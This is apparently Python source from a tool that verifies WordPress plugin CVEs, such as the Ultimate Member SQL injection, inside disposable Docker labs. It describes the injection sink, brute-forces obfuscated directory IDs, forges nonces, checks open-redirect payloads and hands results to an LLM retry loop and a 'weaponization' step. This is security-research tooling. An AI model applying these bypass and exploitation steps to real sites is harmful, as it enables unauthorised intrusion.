def _reverse_hashed_resource_id(hash_value: str, max_n: int = 100) -> Optional[int]:
    """Inverso de _discover_hashed_resource_id: dado un hash YA aceptado por el servidor
    (el mismo esquema, md5(str(n))[10:15]), recupera el ID real `n` que lo produjo -- pura
    computacion local, sin ninguna peticion de red, porque el esquema es conocido (confirmado
    en vivo, Ultimate Member/CVE-2024-1071). Usado para poder escribir META REAL en el recurso
    (ver _SQLI_CUSTOM_SORT_GATE) a partir del hash que ya viaja en la peticion, sin tener que
    adivinar ni rastrear el ID real por ningun otro medio."""
    for n in range(1, max_n + 1):
        if hashlib.md5(str(n).encode()).hexdigest()[10:15] == hash_value:
            return n
    return None


def _finalize_lab(lab: "_Lab", boot: Optional["_LabSession"], res: WpVerifyResult, step,
                  keep_lab_on_failure: bool) -> None:
    """Desmonta el laboratorio al terminar CUALQUIER verificador dinamico de WordPress -- salvo
    que se pida dejarlo vivo (`keep_lab_on_failure`) y la tecnica NO se confirmara: en ese caso
    ninguna tecnica automatica pudo ver la causa real (confirmado en vivo, CVE-2024-1071: el
    plugin capturaba el error de MySQL y respondia con JSON limpio, invisible para error-based/
    UNION/boolean/time-based por igual), asi que insistir con mas payloads a ciegas no ayuda --
    hace falta que el analista mire el contenedor vivo el mismo (wp-content/debug.log via
    `docker exec`). Factorizado UNA vez para los 13 verificadores dinamicos que lo necesitan
    (CSRF incluido -- un negativo ahi puede ser igual de opaco que en SQLi), en vez de repetir
    la misma decision en cada uno."""
    if keep_lab_on_failure and not res.verified and boot is not None:
        step(f"dejando el laboratorio VIVO para inspeccion manual (no se desmonta) -- "
             f"base_url={boot.base_url}, admin={boot.admin_user}/{boot.admin_pass} -- "
             f"mira wp-content/debug.log DENTRO del contenedor con 'docker exec' para ver el "
             f"error real que las tecnicas automaticas no pueden ver si el plugin lo capturo "
             f"antes de que llegara al cuerpo HTTP; desmontalo tu mismo cuando termines "
             f"('docker network rm'/'docker volume rm'/'docker rm -f' con el tag '{lab.tag}', "
             f"o reinicia Docker)")
        res.evidence["laboratorio_vivo"] = {
            "base_url": boot.base_url, "admin_user": boot.admin_user,
            "admin_pass": boot.admin_pass, "lab_tag": lab.tag}
        res.limitations.append(
            f"laboratorio dejado VIVO a proposito (keep_lab_on_failure) para inspeccion manual "
            f"-- desmontalo tu mismo cuando termines (tag Docker: '{lab.tag}')")
    else:
        # Post-verification weaponization (binchomp Phase 03) — runs before teardown so the
        # lab session is still alive. Best-effort: failure never affects the verify verdict.
        if res.verified and boot is not None and not res.evidence.get("weaponization"):
            try:
                from .weaponize import run_weaponization
                _wep = run_weaponization(boot, res, step=step)
                if _wep and _wep.get("technique") not in ("not_applicable", "error", None, ""):
                    res.evidence["weaponization"] = _wep
            except Exception:
                pass
        step("desmontando el laboratorio (contenedores/red/volumen)...")
        lab.teardown()


# algunos plugins con un "campo de orden personalizado" en sus listados/directorios (Member
# Directory, en Ultimate Member) gatean el sumidero vulnerable detras de una comparacion EXACTA
# contra un valor guardado en META del recurso real -- el sumidero en si (confirmado por el
# propio parche oficial, 2.8.2 -> 2.8.3, que lo reescribe con $wpdb->prepare()) es un LEFT JOIN
# con el valor crudo dentro de comillas simples ("...um_key = '{$sortby}'"), pero esa linea
# NUNCA se ejecuta salvo que el valor recibido coincida EXACTO con
# get_post_meta($directory_id, '_um_sortby_custom', true). Como el laboratorio es propio, se
# puede escribir ESE MISMO valor en esa meta justo antes de cada intento -- abriendo la puerta
# uno mismo en vez de depender de que ya estuviera configurada. `directory_id_param` es el
# nombre del parametro (ya resuelto por _discover_hashed_resource_id en algun punto anterior,
# ver _auto_resolve_wp_blockers) cuyo valor es el hash del post real; `meta_key`, la meta que
# hay que mantener sincronizada.
_SQLI_CUSTOM_SORT_GATE = {
    # ultimate-member was here but was WRONG: the actual injection is NOT in the sortby_custom
    # branch (class-member-directory.php line 1464) where WP_Meta_Query properly escapes
    # meta_key. The real CVE-2024-1071 sink is in Member_Directory_Meta::ajax_get_members()
    # (class-member-directory-meta.php line 820): ORDER BY u.$sortby $order — raw string
    # interpolation. That path is active only when member_directory_own_table=1, which the
    # bootstrap now enables. Gate mechanism is not needed there; the injection fires
    # unconditionally on any sorting value that falls to the else branch.
}

def _detect_nopriv_from_source(plugin_source_dir: str, action_name: str) -> bool:
    """Detect whether an AJAX action is registered as unauthenticated (wp_ajax_nopriv_ACTION)
    by scanning the installed plugin PHP source. No hardcoded plugin names — works for any
    plugin: if the source has add_action('wp_ajax_nopriv_X', ...), the endpoint is public."""
    if not plugin_source_dir or not action_name or not os.path.isdir(plugin_source_dir):
        return False
    nopriv_re = re.compile(
        r"add_action\s*\(\s*['\"]wp_ajax_nopriv_" + re.escape(action_name) + r"['\"]",
        re.IGNORECASE,
    )
    for root, _, files in os.walk(plugin_source_dir):
        for fname in files:
            if not fname.endswith(".php"):
                continue
            try:
                with open(os.path.join(root, fname), "r", errors="replace") as fh:
                    if nopriv_re.search(fh.read()):
                        return True
            except Exception:
                continue
    return False


def _scan_php_files_field(plugin_source_dir: str) -> Optional[str]:
    """Scan PHP source for $_FILES['fieldname'] patterns and return the most likely upload field.

    Looks for:  $_FILES['campo']  $_FILES["campo"]  $_FILES[$var] (skipped)
    Also checks move_uploaded_file / is_uploaded_file context to pick the right field when
    multiple $_FILES references exist.

    Fallback: if the plugin bypasses WordPress mime checks (UnfilteredFileSupport,
    upload_mimes filter, ALLOW_UNFILTERED_UPLOADS) but doesn't use direct $_FILES,
    it hooks into the standard WP async-upload mechanism → returns 'async-upload'.

    Returns the field name most associated with upload handling, or None if nothing is found.
    """
    if not plugin_source_dir or not os.path.isdir(plugin_source_dir):
        return None

    files_re = re.compile(r"\$_FILES\s*\[\s*['\"]([A-Za-z0-9_\[\]]+)['\"]", re.IGNORECASE)
    move_re  = re.compile(r"move_uploaded_file\s*\(\s*\$_FILES\s*\[\s*['\"]([A-Za-z0-9_\[\]]+)['\"]",
                          re.IGNORECASE)
    # Signals that the plugin hooks into WP's native media uploader
    wp_native_upload_re = re.compile(
        r"(unfiltered_upload|upload_mimes|wp_check_filetype|UnfilteredFile"
        r"|async-upload|wp_handle_upload|media_handle_upload)",
        re.IGNORECASE,
    )

    from collections import Counter
    counts: Counter = Counter()
    priority: set = set()
    has_wp_native_upload = False

    for root, _, filenames in os.walk(plugin_source_dir):
        for fname in filenames:
            if not fname.endswith(".php"):
                continue
            try:
                content = open(os.path.join(root, fname), "r", errors="replace").read()
            except Exception:
                continue
            for m in move_re.finditer(content):
                field = m.group(1)
                priority.add(field)
                counts[field] += 10
            for m in files_re.finditer(content):
                counts[m.group(1)] += 1
            if not has_wp_native_upload and wp_native_upload_re.search(content):
                has_wp_native_upload = True

    if not counts:
        # If the plugin hooks into WP's native uploader (UnfilteredFileSupport etc.)
        # the upload field is WordPress's standard async-upload field.
        if has_wp_native_upload:
            return "async-upload"
        return None
    # Priority: fields seen next to move_uploaded_file first; then by frequency
    if priority:
        return max(priority, key=lambda f: counts[f])
    # Filter obvious meta-keys (name, type, size, error, tmp_name) — those are sub-keys, not fields
    _META = {"name", "type", "size", "error", "tmp_name"}
    candidates = {k: v for k, v in counts.items() if k.lower() not in _META}
    if candidates:
        return max(candidates, key=lambda f: candidates[f])
    return max(counts, key=lambda f: counts[f])


def _detect_directory_cpt_from_source(plugin_source_dir: str, param_name: str) -> Optional[str]:
    """Detect what CPT to create for a directory-id-style parameter by scanning the plugin
    source for register_post_type calls whose CPT slug contains the parameter's keyword.
    E.g. 'directory_id' → keyword 'directory' → finds register_post_type('um_directory', ...)"""
    if not plugin_source_dir or not param_name or not os.path.isdir(plugin_source_dir):
        return None
    keyword = re.sub(r"_?id$", "", param_name.lower()).strip("_")
    if len(keyword) < 3:
        return None
    cpt_re = re.compile(r"register_post_type\s*\(\s*['\"]([a-z_\-]{2,40})['\"]", re.IGNORECASE)
    for root, _, files in os.walk(plugin_source_dir):
        for fname in files:
            if not fname.endswith(".php"):
                continue
            try:
                with open(os.path.join(root, fname), "r", errors="replace") as fh:
                    for m in cpt_re.finditer(fh.read()):
                        if keyword in m.group(1).lower():
                            return m.group(1)
            except Exception:
                continue
    return None


def _detect_directory_shortcode_from_source(plugin_source_dir: str, cpt_name: str) -> Optional[str]:
    """Detect what shortcode renders the directory listing by scanning for add_shortcode calls
    in PHP files that also contain the CPT name. Returns the shortcode name that contains the
    keyword derived from the CPT (e.g. 'um_directory' → keyword 'directory' → finds
    add_shortcode('ultimatemember_directory', ...))."""
    if not plugin_source_dir or not cpt_name or not os.path.isdir(plugin_source_dir):
        return None
    keyword = re.sub(r"^[a-z]+_", "", cpt_name.lower())  # 'um_directory' → 'directory'
    if len(keyword) < 3:
        return None
    sc_re = re.compile(r"add_shortcode\s*\(\s*['\"]([a-z_\-]{2,60})['\"]", re.IGNORECASE)
    for root, _, files in os.walk(plugin_source_dir):
        for fname in files:
            if not fname.endswith(".php"):
                continue
            try:
                with open(os.path.join(root, fname), "r", errors="replace") as fh:
                    content = fh.read()
                if keyword not in content.lower():
                    continue
                for m in sc_re.finditer(content):
                    if keyword in m.group(1).lower():
                        return m.group(1)
            except Exception:
                continue
    return None


def _detect_setup_trigger_from_source(plugin_source_dir: str) -> list:
    """Detect admin setup trigger URLs by scanning plugin source for admin_init handlers
    that check a GET/REQUEST parameter for install/setup/create/activate values.

    Pattern: plugins that do not register their pages/CPTs during normal wp plugin activate
    but only when an admin visits a specific URL with an action parameter.
    Returns a list of URL paths like ['/wp-admin/admin.php?page=X&action_key=action_val'].
    """
    if not plugin_source_dir or not os.path.isdir(plugin_source_dir):
        return []

    # Find (action_key, action_value) pairs from $_GET checks for install/setup/create verbs
    _action_check_re = re.compile(
        r"\$_(?:GET|REQUEST)\s*\[\s*['\"]([a-z0-9_]{3,50})['\"]"
        r"[^;]{0,80}[=!]=+\s*['\"]"
        r"([a-z0-9_]*(?:install|setup|create|init|activate)[a-z0-9_]*)['\"]",
        re.IGNORECASE | re.DOTALL,
    )
    # Find admin page slugs from add_menu_page / add_submenu_page registrations
    _page_re = re.compile(
        r"add_(?:menu|submenu)_page\s*\([^,]{0,100},[^,]{0,100},[^,]{0,100},\s*['\"]([a-z0-9_\-]{3,50})['\"]",
        re.IGNORECASE,
    )
    # Collect page slugs from all PHP files
    page_slugs: list = []
    action_pairs: list = []
    for root, _, files in os.walk(plugin_source_dir):
        for fname in files:
            if not fname.endswith(".php"):
                continue
            try:
                with open(os.path.join(root, fname), "r", errors="replace") as fh:
                    content = fh.read()
                for m in _page_re.finditer(content):
                    s = m.group(1)
                    if s not in page_slugs:
                        page_slugs.append(s)
                for m in _action_check_re.finditer(content):
                    pair = (m.group(1), m.group(2))
                    if pair not in action_pairs:
                        action_pairs.append(pair)
            except Exception:
                continue

    if not action_pairs or not page_slugs:
        return []

    # Build trigger URLs: combine the most-likely page slug with each action pair.
    # Heuristic: prefer page slugs that contain "option", "setting", "admin", "config".
    _pref = ("option", "setting", "admin", "config", "setup", "install")
    page_slug = next((s for s in page_slugs if any(p in s.lower() for p in _pref)), page_slugs[0])

    return [
        f"/wp-admin/admin.php?page={page_slug}&{key}={val}"
        for key, val in action_pairs[:3]  # cap at 3 to avoid noise
    ]


def _resolve_endpoint_placeholders(endpoint: str, html_sources: list) -> tuple:
    """Si `endpoint` trae un placeholder literal sin resolver tal cual vino de un PoC publico
    (p.ej. '.../admin-ajax.php?action=x&nonce={nonce}&directory_id={dir_id}'), lo rellena con un
    valor REAL raspado de una pagina viva del sitio (el nonce de WordPress embebido en el HTML/JS
    de cualquier pagina que use el plugin atacado) en vez de mandar la llave literal '{nonce}'
    como si fuera el valor -- confirmado en vivo, CVE-2024-1071: el exploit publico de gbrsh trae
    el endpoint como PLANTILLA, y sin esto binoracle manda el string '{nonce}' tal cual, que el
    servidor rechaza siempre con 'Wrong Nonce' -- un bloqueo de infraestructura (placeholder sin
    resolver), no evidencia de que la inyeccion SQL real no exista. Funciona para cualquier
    plugin/CVE, no solo este: no depende de nada especifico de Ultimate Member.

    Los placeholders tipo ID/directorio ('{dir_id}', '{directory_id}'...) se dejan SIN resolver
    aqui a proposito -- bug real confirmado en vivo, CVE-2024-1071, en una demo real: coger "el
    primer numero plausible que aparezca en el HTML" cuela casi siempre ALGUN numero no
    relacionado (un anio de copyright, un post ID, una pagina de paginacion...) en una pagina
    real, y ese valor FALSO nunca se valida contra el servidor antes de usarse -- oculta por
    completo el mecanismo mucho mas fiable que SI existe para esto (fuerza bruta de IDs
    ofuscados, validada contra una respuesta real del servidor; ver el bloque de
    'remaining_placeholders' en _auto_resolve_wp_blockers, que solo se ejecuta sobre los
    placeholders que esta funcion deja SIN tocar)."""
    placeholders = re.findall(r"\{(\w+)\}", endpoint or "")
    if not placeholders:
        return endpoint, {}
    all_html = "\n".join(h for h in html_sources if h)
    nonces = _scrape_nonce_candidates(all_html)
    resolved = {}
    new_endpoint = endpoint
    for ph in placeholders:
        low = ph.lower()
        if "nonce" in low or "token" in low or low in ("security",):
            val = nonces[0] if nonces else None
            if val is not None:
                resolved[ph] = val
                new_endpoint = new_endpoint.replace("{" + ph + "}", val)
    return new_endpoint, resolved


def _auto_resolve_wp_blockers(boot: "_LabSession", lab: "_Lab", slug: str, http_method: str,
                              endpoint: str, base_params: dict, exclude_param: str,
                              res: WpVerifyResult, step,
                              extra_nonce_pages: Optional[list] = None,
                              plugin_source_dir: str = "") -> tuple:
    """Punto de entrada UNICO y compartido por CUALQUIER verificador dinamico de WordPress (no
    solo SQLi) para resolver, antes de construir el ataque real, los bloqueos de infraestructura
    mas comunes que no tienen nada que ver con la tecnica en si: un nonce/token sin resolver
    (como placeholder literal en el endpoint, p.ej. '{nonce}', o como parametro suelto con un
    valor sintetico) y un ID de recurso ofuscado (hash truncado) -- los mismos mecanismos
    confirmados en vivo contra CVE-2024-1071 (Ultimate Member, SQLi), extraidos aqui para que
    cualquier verify_* que construya una peticion con `base_params`+`endpoint` contra
    `boot.sub_sess` los reciba igual, sin duplicar esta logica en cada uno.

    `exclude_param` es el parametro que la tecnica en si va a inyectar/manipular -- nunca se
    toca, aunque su nombre tenga pinta de nonce/token/id (p.ej. un parametro llamado 'token' que
    es precisamente el que se esta probando para IDOR). `extra_nonce_pages`: ver
    verify_wordpress_sqli.

    Devuelve `(endpoint, base_params)` ya resueltos lo mejor posible. Deja constancia en
    `res.evidence` de lo que se resolvio ('placeholders_resueltos', 'endpoint_tras_resolver_'
    'placeholders', 'parametros_resueltos_con_valor_real') y, si NINGUNA pagina real del sitio
    mostro rastro del plugin, de 'nonce_scraping_diagnostico' -- la pista que el bucle de
    aprendizaje-y-reintento del LLM (ver _GENERIC_RETRY_SYS/_SQLI_RETRY_SYS en cve_agent.py)
    necesita para poder proponer una pagina/URL de configuracion especifica en el siguiente
    intento, en vez de quedarse sin ninguna explicacion de por que el scraping no encontro nada."""
    base_params = dict(base_params)
    m = (http_method or "GET").upper()
    nonce_like_keys = [k for k in base_params
                       if any(h in k.lower() for h in ("nonce", "token", "csrf", "security"))
                       and k != exclude_param]
    if re.search(r"\{\w+\}", endpoint or "") or nonce_like_keys:
        probe_urls = [boot.base_url + "/"]
        if getattr(boot, "shortcode_page_path", None):
            probe_urls.append(boot.base_url + boot.shortcode_page_path)
        probe_urls += _list_real_page_urls(lab)
        for p in (extra_nonce_pages or []):
            if p:
                probe_urls.append(boot.base_url + (p if p.startswith("/") else "/" + p))
        seen_urls = set()
        probe_urls = [u for u in probe_urls if not (u in seen_urls or seen_urls.add(u))]
        html_sources = []
        for u in probe_urls:
            try:
                html_sources.append(boot.sub_sess.get(u, timeout=15).text or "")
            except Exception:
                pass
        endpoint, resolved = _resolve_endpoint_placeholders(endpoint, html_sources)
        if resolved:
            step(f"endpoint traia placeholder(s) sin resolver {list(resolved)} -- "
                 f"rellenados con valores reales raspados de entre {len(probe_urls)} "
                 f"pagina(s) reales del sitio")
            res.evidence["placeholders_resueltos"] = resolved
        res.evidence["endpoint_tras_resolver_placeholders"] = endpoint
        nonces_found = _scrape_nonce_candidates("\n".join(html_sources))
        if nonce_like_keys and nonces_found:
            resolved_params = {}
            for k in nonce_like_keys:
                base_params[k] = nonces_found[0]
                resolved_params[k] = nonces_found[0]
            step(f"parametro(s) {list(resolved_params)} parecen nonce/token -- sustituidos por "
                 f"un valor REAL raspado de entre {len(probe_urls)} pagina(s) reales del sitio "
                 f"(el que trajo el PoC/LLM es, como mucho, una adivinanza)")
            res.evidence["parametros_resueltos_con_valor_real"] = resolved_params
        if not nonces_found and not resolved:
            # Fallback: pages don't embed a nonce (plugin requires setup not yet done).
            # Scan the installed plugin source via wp eval to find the nonce action used in
            # wp_verify_nonce() calls, then generate a fresh nonce directly — no pages needed.
            # This is not hardcoded: it reads the actual source every time.
            _gen_nonce = None
            if lab is not None and nonce_like_keys:
                _blocker_ajax_action = str(base_params.get("action", "") or "")
                _eval_find_action = (
                    f"$slug='{slug}';"
                    r"$dir=WP_PLUGIN_DIR.'/'.$slug.'/';"
                    f"$ajax_action='{_blocker_ajax_action}';"
                    r"$nonce_action='';"
                    r"$nonce_extract='/(?:wp_verify_nonce\s*\(\s*\$\w+\s*,|check_ajax_referer\s*\()\s*[\x27\x22]([\w\-]{3,60})[\x27\x22]/i';"
                    r"try{$it=new RecursiveIteratorIterator("
                    r"new RecursiveDirectoryIterator($dir,FilesystemIterator::SKIP_DOTS));"
                    r"$handler_files=[];"
                    r"foreach($it as $f){"
                    r"if($f->getExtension()!=='php')continue;"
                    r"$c=@file_get_contents($f->getPathname());"
                    r"if(!$c)continue;"
                    r"if($ajax_action&&strpos($c,'wp_ajax_'.$ajax_action)!==false)"
                    r"$handler_files[]=['path'=>$f->getPathname(),'c'=>$c];"
                    r"}"
                    r"foreach($handler_files as $hf){"
                    r"if(preg_match($nonce_extract,$hf['c'],$m)){$nonce_action=$m[1];break;}"
                    r"}"
                    r"if(!$nonce_action){"
                    r"$it2=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir,FilesystemIterator::SKIP_DOTS));"
                    r"foreach($it2 as $f2){"
                    r"if($f2->getExtension()!=='php')continue;"
                    r"$c2=@file_get_contents($f2->getPathname());"
                    r"if(!$c2)continue;"
                    r"if(preg_match($nonce_extract,$c2,$m)){$nonce_action=$m[1];break;}"
                    r"}}"
                    r"}catch(Exception $e){}"
                    r"echo $nonce_action;"
                )
                r_act = lab.wp_cli("eval", _eval_find_action, timeout=15)
                _nonce_action = (r_act.stdout or "").strip()
                if _nonce_action:
                    _eval_gen_nonce = (
                        f"wp_set_current_user(0);"
                        f"echo wp_create_nonce('{_nonce_action}');"
                    )
                    r_gen = lab.wp_cli("eval", _eval_gen_nonce, timeout=10)
                    _gen_nonce = (r_gen.stdout or "").strip()
                    if _gen_nonce and len(_gen_nonce) >= 10:
                        for k in nonce_like_keys:
                            base_params[k] = _gen_nonce
                        step(f"nonce generado via wp eval (accion='{_nonce_action}', "
                             f"user_id=0) -- las paginas publicadas no embeben el nonce "
                             f"del plugin ({slug}) porque requieren configuracion previa")
                        res.evidence["nonce_generado_via_eval"] = {
                            "action": _nonce_action, "value": _gen_nonce}
            if not _gen_nonce:
                res.evidence["nonce_scraping_diagnostico"] = (
                    f"se probaron {len(probe_urls)} pagina(s) reales ya publicadas del sitio "
                    f"(incluida la portada) y NINGUNA tenia un nonce ni ningun rastro visible del "
                    f"plugin '{slug}' -- puede que el plugin necesite un paso de configuracion "
                    f"propio (p.ej. crear sus paginas por defecto via una accion de administrador) "
                    f"antes de que su contenido aparezca en ningun lado")

    # Para plugins cuyo sumidero vulnerable está detrás de un 'directory_id' obligatorio
    # (Ultimate Member, etc.) el LLM a veces no incluye ese parámetro en base_params --
    # pre-poblarlo con un placeholder vacío para que el bucle de fuerza bruta a continuación
    # lo encuentre y lo resuelva. Además, si tenemos acceso al lab, consultar WP-CLI para
    # obtener el ID real del post um_directory (o del CPT configurado) y calcular el hash
    # directamente -- más rápido y fiable que la fuerza bruta ciega.
    gate_cfg = _SQLI_CUSTOM_SORT_GATE.get(slug, {})
    dir_id_param = gate_cfg.get("directory_id_param", "")
    # Resolve even when already in base_params with a plain-digit placeholder (e.g. "1" from
    # the PoC default) — the placeholder is useless and will always cause "Wrong member
    # directory data"; the real hash must come from WP-CLI or brute-force, not from the PoC.
    _dir_id_is_placeholder = str(base_params.get(dir_id_param, "")).isdigit()
    if dir_id_param and dir_id_param != exclude_param and (
            dir_id_param not in base_params or _dir_id_is_placeholder):
        # Detect the directory CPT from source and find the first post of that type.
        # plugin_source_dir is not in scope here — use _PLUGIN_DIRECTORY_CPT as a last-resort
        # fallback (empty dict: source detection in _bootstrap_lab is the primary path).
        cpt_name = _PLUGIN_DIRECTORY_CPT.get(slug, "")
        resolved_via_cli = False
        if cpt_name and lab is not None:
            try:
                import hashlib as _hl
                r_id = lab.wp_cli("post", "list", f"--post_type={cpt_name}",
                                  "--post_status=any", "--format=ids",
                                  "--posts_per_page=1", timeout=15)
                raw_id = (r_id.stdout or "").strip().split()[0] if r_id.returncode == 0 else ""
                if raw_id.isdigit():
                    _n = int(raw_id)
                    _hashed = _hl.md5(str(_n).encode()).hexdigest()[10:15]
                    base_params[dir_id_param] = _hashed
                    # UM's get_directory_by_hash() uses SUBSTRING(MD5(ID),11,5) directly
                    # in SQL, not _um_hash post meta. Write the meta anyway for compatibility
                    # with any future UM version that might change the lookup strategy.
                    lab.wp_cli("post", "meta", "update", raw_id, "_um_hash", _hashed,
                               timeout=15)
                    step(f"'{dir_id_param}' resuelto directamente via WP-CLI (post "
                         f"{cpt_name} ID={_n} -> hash '{_hashed}'); "
                         f"_um_hash meta sincronizado en el post")
                    resolved_via_cli = True
            except Exception:
                pass
        if not resolved_via_cli:
            # Fallback: dejar vacío para que la fuerza bruta lo resuelva abajo
            base_params[dir_id_param] = ""
            step(f"'{dir_id_param}' no estaba en los parámetros -- añadido para "
                 f"que la fuerza bruta de IDs ofuscados lo resuelva")

    other_id_params = [k for k in base_params
                       if k != exclude_param and k not in nonce_like_keys
                       and any(h in k.lower() for h in ("id", "dir"))]
    remaining_placeholders = [ph for ph in re.findall(r"\{(\w+)\}", endpoint or "")
                              if any(h in ph.lower() for h in ("id", "dir"))]
    # If _bootstrap_lab already computed the directory hash via MySQL, use it directly for
    # any param that looks like a directory ID — avoids brute-force (which requires a valid
    # nonce and may fail if the nonce action isn't embedded in any published page).
    if getattr(boot, "directory_hash", None):
        _hash_applied = False
        for k in other_id_params:
            if any(h in k.lower() for h in ("dir",)) or str(base_params.get(k, "")).isdigit():
                base_params[k] = boot.directory_hash
                step(f"parametro '{k}' asignado con hash MySQL confirmado '{boot.directory_hash}' "
                     f"(calculado en bootstrap, sin fuerza bruta)")
                res.evidence.setdefault("parametros_resueltos_con_valor_real", {})[k] = boot.directory_hash
                _hash_applied = True
        if not _hash_applied:
            # LLM omitted the directory hash param: detect its name from source code.
            # Scan for $_POST['X'] or $_REQUEST['X'] where X contains "dir" or "id"
            # in files that also contain the hash lookup SQL (SUBSTRING(MD5) or get_directory_by_hash).
            _dir_param_name = "directory_id"  # sensible default
            if plugin_source_dir and os.path.isdir(plugin_source_dir):
                _hash_sql_re = re.compile(r"SUBSTRING\s*\(MD5|get_directory_by_hash", re.I)
                _post_param_re = re.compile(r"\$_(?:POST|REQUEST)\[['\"]([\w_]{3,40})['\"]\]", re.I)
                for _root3, _, _files3 in os.walk(plugin_source_dir):
                    for _fn3 in _files3:
                        if not _fn3.endswith(".php"):
                            continue
                        try:
                            _fc3 = open(os.path.join(_root3, _fn3), encoding="utf-8",
                                        errors="replace").read()
                        except Exception:
                            continue
                        if not _hash_sql_re.search(_fc3):
                            continue
                        for _pm in _post_param_re.finditer(_fc3):
                            _pk = _pm.group(1)
                            if any(h in _pk.lower() for h in ("dir",)):
                                _dir_param_name = _pk
                                break
                    else:
                        continue
                    break
            base_params.setdefault(_dir_param_name, boot.directory_hash)
            if base_params[_dir_param_name] != boot.directory_hash:
                base_params[_dir_param_name] = boot.directory_hash
            step(f"parametro '{_dir_param_name}' (detectado en source, omitido por el LLM) "
                 f"inyectado con hash MySQL '{boot.directory_hash}'")
            res.evidence.setdefault("parametros_resueltos_con_valor_real", {})[_dir_param_name] = boot.directory_hash
        other_id_params = []  # already resolved — skip brute-force
    for k in other_id_params:
        def _probe_param_id(cand, _k=k):
            payload = dict(base_params)
            payload[_k] = cand
            r = boot.sub_sess.request(m, boot.base_url + endpoint,
                                      data=payload if m != "GET" else None,
                                      params=payload if m == "GET" else None, timeout=15)
            return '"success":true' in (r.text or "")
        found = _discover_hashed_resource_id(_probe_param_id)
        if found:
            base_params[k] = found
            step(f"parametro '{k}' parece un ID ofuscado -- encontrado un valor ACEPTADO por "
                 f"el servidor tras probar el esquema de hash truncado conocido (confirmado en "
                 f"vivo, Ultimate Member/CVE-2024-1071): {found}")
            res.evidence.setdefault("parametros_resueltos_con_valor_real", {})[k] = found
    for ph in remaining_placeholders:
        def _probe_endpoint_id(cand, _ph=ph, _endpoint=endpoint):
            cand_endpoint = _endpoint.replace("{" + _ph + "}", cand)
            r = boot.sub_sess.request(m, boot.base_url + cand_endpoint,
                                      data=dict(base_params) if m != "GET" else None,
                                      params=dict(base_params) if m == "GET" else None,
                                      timeout=15)
            return '"success":true' in (r.text or "")
        found = _discover_hashed_resource_id(_probe_endpoint_id)
        if found:
            endpoint = endpoint.replace("{" + ph + "}", found)
            step(f"placeholder '{{{ph}}}' del endpoint parece un ID ofuscado -- encontrado un "
                 f"valor ACEPTADO por el servidor tras probar el esquema de hash truncado "
                 f"conocido (confirmado en vivo, Ultimate Member/CVE-2024-1071): {found}")
            res.evidence.setdefault("placeholders_resueltos", {})[ph] = found
            res.evidence["endpoint_tras_resolver_placeholders"] = endpoint
    return endpoint, base_params


def _redirect_location_is_external(location: str, evil_host: str) -> bool:
    """Confirma que una cabecera Location real redirige de verdad al host externo -- NUNCA un
    simple `evil_host in location` (substring), que da un falso positivo real y confirmado en
    vivo: un payload como '/https://{evil_host}/pwned' hace que el servidor devuelva ese string
    LITERAL en Location, pero un navegador lo trata como una ruta RELATIVA al mismo origen (el
    '/' inicial lo ancla ahi), nunca como salto a otro dominio -- el texto 'evil_host' aparece en
    la cadena sin que haya ninguna redireccion externa de verdad. En vez de eso, se recompone la
    URL (normalizando backslash a forward slash, como hacen los navegadores) y se mira el HOST
    real tras resolver el truco de userinfo (user:pass@host -- el host real es lo que va DESPUES
    de la ultima '@'), no si el texto aparece en cualquier parte."""
    if not location or not evil_host:
        return False
    normalized = location.replace("\\", "/")
    netloc = urllib.parse.urlsplit(normalized).netloc
    if not netloc:
        return False
    host = netloc.rsplit("@", 1)[-1].split(":")[0]
    return evil_host.lower() in host.lower()


def _token() -> str:
    return secrets.token_hex(4)


def _lab_host() -> str:
    """Host desde el que ESTE PROCESO (el propio binoracle) debe hablarle al laboratorio por
    HTTP de forma DIRECTA -- usado por los chequeos de arranque (http_ready() y los equivalentes
    en drupalverify.py/joomlaverify.py), que siempre los hace este mismo proceso, nunca Burp.
    Cuando binoracle corre dentro de un contenedor y usa el socket del HOST para pilotar Docker
    (Docker-fuera-de-Docker, el patron que docker-compose.yml monta), el puerto que publicamos
    para WordPress se abre en el 127.0.0.1 del HOST, NO en el 127.0.0.1 de nuestro propio
    contenedor -- son namespaces de red distintos. Sin esto, http_ready nunca llegaba a WordPress
    aunque Apache arrancara bien (confirmado en vivo: los logs mostraban 'resuming normal
    operations' pero 'WordPress no respondio a tiempo' seguia saliendo). host.docker.internal
    resuelve al HOST de verdad (Docker Desktop en Mac/Windows de forma nativa; en Linux via el
    extra_hosts que docker-compose.yml anade). Si binoracle NO corre en un contenedor (p.ej. los
    tests de este repo en el sandbox de desarrollo), 127.0.0.1 ya es correcto y
    host.docker.internal no existira.

    Por lo mismo, el laboratorio efimero (WordPress/Drupal/Joomla) NUNCA envia sus propias
    peticiones de login/ataque a traves de Burp, aunque --burp-mcp-url este configurado (ver
    _wp_login/_drupal_login/_joomla_login, que usan requests.Session() directamente en vez de
    _make_session()) -- Burp corre NATIVO en la maquina del analista, fuera de cualquier
    contenedor, y 'host.docker.internal' es un alias que Docker Desktop solo resuelve PARA
    CONTENEDORES, nunca para el sistema operativo anfitrion en si (confirmado en vivo: con un
    intento anterior de enrutar estas peticiones por Burp, lanzaba java.net.UnknownHostException:
    host.docker.internal). Mantener el laboratorio efimero SIEMPRE directo, sin Burp de por
    medio, evita esa clase entera de problema -- Burp (via configure_burp_mcp) sigue disponible
    para los verificadores GENERICOS dirigidos por el analista (genericverify.py), donde no hay
    ningun contenedor Docker-fuera-de-Docker de por medio."""
    if os.path.exists("/.dockerenv"):
        try:
            socket.gethostbyname("host.docker.internal")
            return "host.docker.internal"
        except OSError:
            pass
    return "127.0.0.1"


class _Lab:
    """Agrupa los recursos Docker efimeros de una verificacion (red/volumen/contenedores) y
    garantiza su limpieza. Nunca deja nada vivo, tampoco si algo falla a mitad de camino."""

    def __init__(self, tag: str):
        self.tag = tag
        self.net = f"binoracle-wpverify-{tag}"
        self.vol = f"binoracle-wpverify-{tag}-html"
        self.mysql = f"binoracle-wpverify-{tag}-db"
        self.wp = f"binoracle-wpverify-{tag}-wp"
        self._created: List[str] = []
        self._db_env: List[str] = []   # -e flags reusados por wp_cli() (ver nota en wp_cli)

    def sh(self, *args, timeout=60.0, input_text=None):
        return _run(["docker"] + list(args), timeout=timeout, input_text=input_text)

    def setup_network_and_volume(self):
        # Retry up to 3× with 3s back-off for transient Docker daemon network races
        # ("network not found", "address already in use" for the bridge subnet, etc.)
        import time as _time
        _net_err = ""
        for _attempt in range(3):
            r = self.sh("network", "create", self.net, timeout=30)
            if r.returncode == 0:
                break
            _net_err = r.stderr.strip()[:200]
